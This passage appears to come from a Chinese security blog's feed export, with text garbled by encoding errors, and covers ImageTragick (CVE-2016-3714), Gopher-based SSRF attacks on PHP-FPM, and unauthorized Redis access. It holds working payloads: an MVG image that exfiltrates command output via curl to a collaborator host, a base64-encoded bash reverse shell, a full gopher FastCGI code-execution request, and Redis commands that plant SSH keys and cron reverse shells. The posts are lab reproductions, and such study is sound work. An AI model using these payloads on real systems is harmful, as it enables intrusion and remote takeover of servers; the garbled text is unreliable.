alt="ZnjpHH.png"></p><p>å½“ç„¶ï¼Œåœ¨pç‰›çš„åšå®¢ä¸­ä¹Ÿæå‡ºäº†åŸºäºè¿™ä¸ªæ¼æ´åŸç†çš„å¥½å‡ ä¸ªCVEçš„åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥å»å°è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œæˆ‘æˆªå–äº†æˆ‘è‡ªå·±å®ç°æ–‡ä»¶åˆ é™¤æ•ˆæœå›¾</p><p><img src="https://s2.ax1x.com/2019/06/27/ZnvyYn.png" alt="ZnvyYn.png"></p><p>å½“ç„¶ï¼Œpç‰›çš„è¿™ä¸ªç¯å¢ƒå»æä¾›äº†ä¸€ä¸ªä¸Šä¼ æ¥å£è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä»–çš„è¿™ä¸ªä»£ç æ˜¯å¦‚ä½•å»è§¦å‘è¿™ä¸ªæ¼æ´çš„ï¼Œå¯ä»¥å‘ç°å®ƒæ˜¯åˆ©ç”¨PHPæ‰©å±•ImageMagickå»è§¦å‘è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸”åªéœ€è¦è°ƒç”¨äº†Imagickç±»çš„æ„é€ æ–¹æ³•ï¼Œå³å¯è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œæ‰€ä»¥è¿™å°±ç»™æˆ‘ä»¬æ‰©å¤§åˆ©ç”¨æ€è·¯çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå°±æ˜¯ä¸åŒè¯­è¨€ImageMagickæ‹“å±•éƒ½å¾ˆæœ‰å¯èƒ½å¯¼è‡´è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±åœ¨å®æˆ˜ä¸­å»æµ‹è¯•ä¸€ä¸‹å•¦</p><p><img src="https://s2.ax1x.com/2019/06/27/Zup4jx.png" alt="Zup4jx.png"></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°è¯•æ„é€ ä¸€ä¸ªå«æœ‰payloadçš„pngå›¾ç‰‡äº†ï¼Œä½†æ˜¯é¡µé¢æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å»åšä¸€ä¸ªDNSlogå¸¦å‡ºä¸€éƒ¨åˆ†æ•°æ®ï¼Œæ„é€ çš„payloadå¦‚ä¸‹ï¼Œç„¶åä¸Šä¼ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://127.0.0.0/oops.jpg&quot;|curl &quot;`whoami`.5bhnpoiffg2hswzgylt6a5jjmas1gq.burpcollaborator.net)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>bpæ¥æ”¶åˆ°çš„ä¿¡æ¯å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°æˆåŠŸå¸¦å‡ºæ•°æ®</p><p><img src="https://s2.ax1x.com/2019/06/27/ZumzMF.png" alt="ZumzMF.png"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥å®ç°ä¸€ä¸ªåå¼¹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://a.com/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNzAuMTUwLzIzMzMgMD4mMQ== | base64 -d | bash`&quot;|| &quot; )&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/27/Zuu7hq.png" alt="Zuu7hq.png"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ol><li>æ¼æ´å½±å“ImageMagick 6.9.3-9ä»¥å‰æ˜¯æ‰€æœ‰ç‰ˆæœ¬ï¼Œæ€è·¯ä¸»è¦æ˜¯æ„é€ å›¾ç‰‡ï¼Œé‡Œé¢çš„payloadéœ€è¦è®¾ç½®å¥½ï¼Œè®©ImageMagickç»„ä»¶å¯¹å…¶è¿›è¡Œåº•å±‚systemå‡½æ•°çš„è§¦å‘ã€‚</li><li>é˜²å¾¡çš„æ–¹å¼ï¼Œå…¶ä¸€æ˜¯é€šè¿‡å‡çº§åˆ°é«˜ç‰ˆæœ¬ç»„ä»¶ï¼Œå…¶äºŒæ˜¯é€šè¿‡é…ç½®policy.xmlçš„æ–¹å¼æ¥ç¦æ­¢httpsã€mvgè¿™äº›delegateï¼Œæˆ–è€…ç›´æ¥åœ¨é…ç½®æ–‡ä»¶åˆ é™¤ç›¸åº”çš„delegateã€‚</li></ol><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><p><a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a></p>]]></content>
      
      <categories>
          
          <category> å‘½ä»¤æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Gopheræ”»å‡»FastCGIçš„å°ç»“</title>
      <link href="/Gopher-fastcgi.html"/>
      <url>/Gopher-fastcgi.html</url>
      <content type="html"><![CDATA[<p>è¿™ä¸€ç¯‡æ–‡ç« æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« çš„ä¸€äº›æ‰©å±•å†…å®¹ï¼Œè™½ç„¶è¿™ä¸ªç¯å¢ƒæå…¶è‹›åˆ»ï¼Œä½†æ˜¯å­¦åˆ°ä¸€äº›æ–°çš„çŸ¥è¯†å°±å¥½ã€‚</p><p>è¿™ç¯‡æ–‡ç« å¤§å¤šæ•°å†…å®¹æ˜¯æ¥è‡ªpç¥åšæ–‡çš„ï¼Œæˆ‘åªæ˜¯åšä¸ªæ€»ç»“é¡ºä¾¿åšä¸ªå¤ç°ï¼ŒOrzã€‚<a id="more"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>Fastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚fastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p><h3 id="PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰"><a href="#PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰" class="headerlink" title="PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰"></a>PHP-FPMï¼ˆFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼‰</h3><p>ä¸ºä»€ä¹ˆä½¿ç”¨nginxè¿›è¡Œæ­å»ºphpç¯å¢ƒçš„æ—¶å€™ä¼šå‡ºç°php-fpmï¼ŸFPMå…¶å®æ˜¯ä¸€ä¸ªfastcgiåè®®è§£æå™¨ï¼ŒNginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚ç„¶åå†é€šè¿‡FPMå»å°†æ•°æ®äº¤ç»™å¯¹åº”çš„PHPæ–‡ä»¶ã€‚</p><p>è¿™ç¯‡æ–‡ç« çš„å…³é”®é—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªfpmæ¥æ”¶çš„æ•°æ®ä¸Šï¼Œåªè¦æˆ‘ä»¬æˆ‘ä»¬æ„é€ æ»¡è¶³åè®®è§„èŒƒçš„è¯·æ±‚åŒ…å»è®¿é—®è¯¥è¿›ç¨‹ç›‘å¬çš„ç«¯å£ï¼Œå°±å¯ä»¥å¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œï¼Œä½†æˆ‘ä»¬åœ¨åè®®ä¸­éœ€è¦æ‰“å¼€è®¾ç½®<code>auto_prepend_file = php://input</code>ä¸”<code>allow_url_include = On</code></p><h3 id="åˆ©ç”¨çš„æ¡ä»¶"><a href="#åˆ©ç”¨çš„æ¡ä»¶" class="headerlink" title="åˆ©ç”¨çš„æ¡ä»¶"></a>åˆ©ç”¨çš„æ¡ä»¶</h3><ul><li>libcurlç‰ˆæœ¬&gt;=7.45.0(ç”±äºEXPé‡Œæœ‰%00ï¼ŒCURLç‰ˆæœ¬å°äº7.45.0çš„ç‰ˆæœ¬ï¼Œgopherçš„%00ä¼šè¢«æˆªæ–­)</li><li>PHP-FPMç›‘å¬ç«¯å£</li><li>PHP-FPMç‰ˆæœ¬ &gt;= 5.3.3</li><li>çŸ¥é“æœåŠ¡å™¨ä¸Šä»»æ„ä¸€ä¸ªphpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</li></ul><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ vulhunbä¸Šçš„çš„ fpm ç¯å¢ƒï¼Œé»˜è®¤æ˜¯ç›‘å¬çš„9000ç«¯å£</p><p><img src="https://s2.ax1x.com/2019/06/23/ZPwJoR.png" alt="ZPwJoR.png"></p><p>ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªphpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç°åœ¨å¤ç°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>find / -name &quot;*.php&quot;</code>å»æ‰¾ï¼Œå®é™…æƒ…å†µä¸­çš„è¯å°±å¾—çˆ†ç ´å»æ‰¾äº†23333</p><p>ä½¿ç”¨pç¥çš„<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">è„šæœ¬</a>æµ‹è¯•ä¸€ä¸‹è¿™ä¸ªå¼€æ”¾çš„9000ç«¯å£ï¼Œæ˜¯å¯ä»¥æˆåŠŸå®ç°çš„ï¼Œæ‰€ä»¥è¯´ç›´æ¥å‘å¤–ç½‘æš´éœ²å‡ºè¿™ä¸ªæœåŠ¡çœŸçš„å¾ˆå±é™©ã€‚</p><p><img src="https://s2.ax1x.com/2019/06/23/ZP6Qhj.png" alt="ZP6Qhj.png"></p><p>ä½†æ˜¯æ—¢ç„¶æœ¬ç¯‡æ–‡ç« æ˜¯ä¸Šä¸€ç¯‡æ–‡ç« çš„æ‰©å±•ï¼Œå°±éœ€è¦ä»ssrfçš„è§’åº¦å»å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œå› æ­¤å…ˆæ˜¯æœ¬åœ°æŠ“å–ä¸€æ³¢æµé‡ï¼Œè¿™é‡Œä½¿ç”¨ncçš„æ–¹å¼å»è·å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 -p 2333 -c <span class="string">"&lt;?php system('echo sectest &gt; /tmp/1.php'); exit;?&gt;"</span> /usr/<span class="built_in">local</span>/lib/php/PEAR.php</span><br></pre></td></tr></table></figure><p>ncç›‘å¬å¹¶è·å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333 &gt;  1.txt</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹å…¶å†…å®¹è¿›è¡Œurlç¼–ç ï¼Œè·å¾—exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'1.txt'</span>)</span><br><span class="line"></span><br><span class="line">ff = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> quote(ff)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/23/ZPWG0P.png" alt="ZPWG0P.png"></p><p>æ„é€ gopheråè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01xt%00%08%00%00%00%01%00%00%00%00%00%00%01%04xt%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04xt%00%00%00%00%01%05xt%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05xt%00%00%00%00</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨curlå»æ¨¡æ‹Ÿï¼Œè§‚å¯Ÿtmpç›®å½•ä¸‹ç¡®å®å†™å…¥æ–‡ä»¶</p><p><img src="https://s2.ax1x.com/2019/06/23/ZPfk9g.png" alt="ZPfk9g.png"></p><p>åªè¦åœ¨ssrfä¸‹æ¢æµ‹åˆ°æœ‰fpmæ¥å£çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è·å¾—ä»£ç æ‰§è¡Œçš„æƒé™å•¦ã€‚</p><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p><a href="https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html" target="_blank" rel="noopener">https://www.virtua1.cn/index.php/web-security/%E6%B5%85%E8%B0%88ssrf%E6%BC%8F%E6%B4%9E-gopher%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E7%AF%87.html</a></p>]]></content>
      
      <categories>
          
          <category> FastCGI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> FastCGI </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>redisæœªæˆæƒè®¿é—®æ¼æ´ä¸€äº›åˆ©ç”¨</title>
      <link href="/redis-vul.html"/>
      <url>/redis-vul.html</url>
      <content type="html"><![CDATA[<h3 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h3><p>Rediså› é…ç½®ä¸å½“å¯ä»¥æœªæˆæƒè®¿é—®ã€‚æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚(æœ‰ç‚¹ä¸å‹å¥½ï¼Œå¯èƒ½ç›´æ¥ä¼šå¯¼è‡´å®•æœº)<a id="more"></a></p><p>å¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ã€‚</p><h3 id="æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨"><a href="#æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨" class="headerlink" title="æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨"></a>æœªæˆæƒredisçš„ä¸€äº›è¿ç”¨</h3><h4 id="å†™ä¸ªshell"><a href="#å†™ä¸ªshell" class="headerlink" title="å†™ä¸ªshell"></a>å†™ä¸ªshell</h4><p>è¿™é‡Œæˆ‘ä»¥Ubuntu 14ç‰ˆåšçš„æµ‹è¯•ï¼Œå¾€ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹å†™ä¸€ä¸ªwebshellå°±è¡Œï¼Œåœ¨redisä¸Šè®¾ç½®äº†ç›®å½•ä»¥åŠæ–‡ä»¶åï¼Œå†™å…¥å†…å®¹</p><p><img src="https://s2.ax1x.com/2019/06/15/VIyLI1.png" alt="VIyLI1.png"></p><p>æ·»åŠ ä¸Šå»æ˜¯ä»¥è¿è¡Œçš„äººæƒé™æ·»åŠ çš„</p><p><img src="https://s2.ax1x.com/2019/06/15/VI6pse.png" alt="VI6pse.png"></p><p>å½“ç„¶ä¹Ÿèƒ½æ‰§è¡Œ</p><p><img src="https://s2.ax1x.com/2019/06/15/VI69qH.png" alt="VI69qH.png"></p><h4 id="ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•"><a href="#ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•" class="headerlink" title="ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•"></a>ä½¿ç”¨ç§˜é’¥è¿›è¡Œç™»å½•</h4><p>ç°åœ¨æœ¬æœºç”Ÿæˆä¸€å¯¹ç§˜é’¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/15/VoJHGd.png" alt="VoJHGd.png"></p><p>æŠŠå…¬é’¥æ‹¿å‡ºæ¥</p><p><img src="https://s2.ax1x.com/2019/06/15/VoY9iQ.png" alt="VoY9iQ.png"></p><p>åœ¨redisé‡Œé¢è®¾ç½®å†™æ“ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm5rJyVESTrJT1DESSsXJbXrvBKTUPV5wqfmsmCKcWp2ysV/JVP4MUk+NKbVsg8wb4QuU0IueWd+vIi8jLiAEennl01idUujE75BxJ0exKqJ18jJfNemu//RLOmasXrZ9I/NJB5LtVcRDkN8MZevK2zzKxPJuZlH8plL4sLft1kXOHNWORylDQpAodF8qlI1LiKbR6ZRb/1m3Xy8XGzJ4wkdghSJDE1SPAwC5JJq1rVmAoIs6hujrlsy0LHSCAm+fViKPnRIi94NotCKdtyrQqv3VtvblGRfT/h+My4WUjfQLKjocomLDuUGOgBFp6DOAV8BGxX+7KAMm0Z9NAkpaF root@Chan\n\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/06/15/VoYPRs.png" alt="VoYPRs.png"></p><p>æœ€åå°±å¯ä»¥æˆåŠŸè¿æ¥sshï¼Œå®Œå…¨ä¸éœ€è¦å¯†ç </p><p><img src="https://s2.ax1x.com/2019/06/15/VoYui4.png" alt="VoYui4.png"></p><h4 id="redisè®¾ç½®å®šæ—¶ä»»åŠ¡"><a href="#redisè®¾ç½®å®šæ—¶ä»»åŠ¡" class="headerlink" title="redisè®¾ç½®å®šæ—¶ä»»åŠ¡"></a>redisè®¾ç½®å®šæ—¶ä»»åŠ¡</h4><p>è¿™ä¸ªå°±æ˜¯åˆ©ç”¨ä¸€ä¸ªå†™çš„æ“ä½œå»å®ç°å®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯é…è¿™ä¸ªç¯å¢ƒè´¼å‘ã€‚ã€‚ä¸Šé¢çš„Ubuntuéƒ½ä¸èƒ½å®ç°ã€‚ã€‚æˆ‘ç”¨çš„æ˜¯centos</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> 1 <span class="string">"\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.70.147/2444 0&gt;&amp;1\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>å®šæ—¶ä»»åŠ¡æ€ä¹ˆè®¾ç½®ï¼Œè¿™ä¸ªå›¾å¾ˆæ¸…æ¥šäº†</p><p><a href="https://www.wuliaole.com/post/what_you_need_to_know_about_cron_and_crontab/crontab.jpg" target="_blank" rel="noopener"><img src="https://www.wuliaole.com/post/what_you_need_to_know_about_cron_and_crontab/crontab.jpg" alt="crontabçš„è¯­æ³•æ ¼å¼"></a></p><p>ç”¨çš„å°±è¿™ä¹ˆå‡ å¥è¯ï¼Œé…ç¯å¢ƒé…ä¸€ä¸ªä¸‹åˆ</p><p><img src="https://s2.ax1x.com/2019/06/15/Vo83sf.png" alt="Vo83sf.png"></p><p>è¿™é‡Œæ³¨æ„åå¼¹shellçš„è¯­å¥è¦åŠ ä¸Šæ¢è¡Œç¬¦ï¼Œä¸ç„¶çš„è¯åœ¨rootæ–‡ä»¶é‡Œé¢æ˜¯æ‰§è¡Œä¸äº†çš„ï¼Œå› ä¸ºä»¥redisæœåŠ¡å†™å…¥çš„å‰é¢ä¼šåŠ ä¸Šä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œå¾ˆå¯èƒ½å°±ä¸èƒ½æˆåŠŸæ‰§è¡Œï¼Œå®³æ€•æ‰§è¡Œä¸äº†çš„è¯åŠ å¤šå‡ ä¸ªæ¢è¡Œç¬¦å§ã€‚è¿™ä¹Ÿè§£é‡Šäº†æˆ‘ä¸Šå›¾ä¸ºä½•ä½¿ç”¨tacå»è¯»æ–‡ä»¶ï¼Œç®€å•çš„catæœ‰æ—¶å€™è¿˜è¯»ä¸å‡ºæ¥ï¼Œxxdä¹Ÿå¯ä»¥è¯»</p><p>ç„¶åå¦å¤–ä¸€ä¸ªæœºå­å¼€å§‹ç›‘å¬ï¼ŒæˆåŠŸç›‘å¬</p><p><img src="https://s2.ax1x.com/2019/06/15/Vo8WWR.png" alt="Vo8WWR.png"></p><p>è¿™ä¸ªç¯å¢ƒæœ‰å‡ ä¸ªå‘ç‚¹è¦æ³¨æ„ä¸€ä¸‹ï¼Œç¬¬ä¸€è®¾ç½®å®šæ—¶ä»»åŠ¡ç”¨Ubuntuçš„ç³»ç»Ÿæ˜¯ä¸è¡Œçš„ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<code>https://joychou.org/hostsec/linux-crontab-rebound-shell-hole.html</code>ï¼Œç½‘ä¸Šå¾ˆå¤šç›´æ¥Ubuntuæˆ–è€…kaliè¾“å…¥é‚£ä¸ªå‘½ä»¤ä¹‹åç„¶åå°±è¯´ç­‰ä¸ªä¸€åˆ†é’Ÿçš„é‚£ç§åšå®¢ï¼ŒçœŸæ˜¯é†‰äº†ï¼Œç¡®å®æ˜¯æœ‰ç‚¹ä¸è´Ÿè´£äº†ã€‚ã€‚ã€‚joychouå¤§ä½¬ä¹Ÿæ€»ç»“äº†ï¼Œä¸ºå•¥ä¸è¡Œçš„åŸå› </p><p>ubuntuåˆ©ç”¨å†™æ–‡ä»¶æ‰§è¡Œcrontabä¸ä¼šæˆåŠŸã€‚åŸå› æœ‰ä¸¤ç‚¹ï¼š</p><ol><li>å¦‚æœå†™<code>/etc/crontab</code>ï¼Œè¯­æ³•ä¸è¯†åˆ«</li><li>å¦‚æœå†™<code>/var/spool/cron/crontabs/root</code>ï¼Œæƒé™ä¸æ˜¯600ï¼Œè€Œä¸”è¯­æ³•ä¹Ÿä¸è¯†åˆ«</li></ol><p>ç¬¬äºŒcurlçš„ç‰ˆæœ¬æ˜¯å¦æ”¯æŒgopherï¼Œå› ä¸ºæˆ‘è¿™é‡Œå®‰è£…çš„centosé»˜è®¤ç‰ˆæœ¬çš„curlä¸æ”¯æŒgopheråè®®ï¼Œphpçš„curlåº•å±‚è°ƒç”¨çš„æ˜¯ç³»ç»Ÿçš„curlï¼Œå°±ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå› æ­¤æˆ‘æŠŠå®ƒç»™å‡çº§äº†ã€‚</p><p>JoyChouå¤§ä½¬çš„åšå®¢çš„è¿˜æœ‰ä¸€äº›åˆ©ç”¨ï¼Œä½¿ç”¨gopher åè®®  ï¼Œä¸€èˆ¬æ˜¯å…³è”ä¸Šssrfæ¼æ´çš„ä½¿ç”¨çš„</p><p>åœºæ™¯ï¼š  web ssrfâ€“&gt;gopherâ€“&gt;redis <strong>æ²¡å¯†ç </strong>   â€“&gt; è¿ç”¨cron   â€“&gt;åå¼¹shell</p><h5 id="ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯gopheråè®®ï¼Ÿ</h5><p>gopheræ˜¯ä¸€ä¸ªäº’è”ç½‘ä¸Šä½¿ç”¨çš„åˆ†å¸ƒå‹çš„æ–‡ä»¶æœé›†è·å–ç½‘ç»œåè®®</p><p>gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚:å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­â€“ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚</p><p>ä½¿ç”¨gopherè¯·æ±‚ï¼Œé¦–å…ˆä½ å¾—æŠ“å‡ºæµé‡æ‰è¡Œï¼Œåˆ©ç”¨socatåšä¸€ä¸ªç«¯å£è½¬å‘ï¼Œæ³¨æ„è¿™é‡Œçš„æµé‡ï¼Œæ˜¯ä¸ºäº†æˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨gopherè€Œåˆ©ç”¨åœ¨æœ¬åœ°æµ‹è¯•æŠ“çš„</p><p>æœ¬åœ°åˆ©ç”¨ä¸€ä¸ªshellè„šæœ¬å’Œsocatåšä¸€ä¸ªæµé‡æŠ“å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> 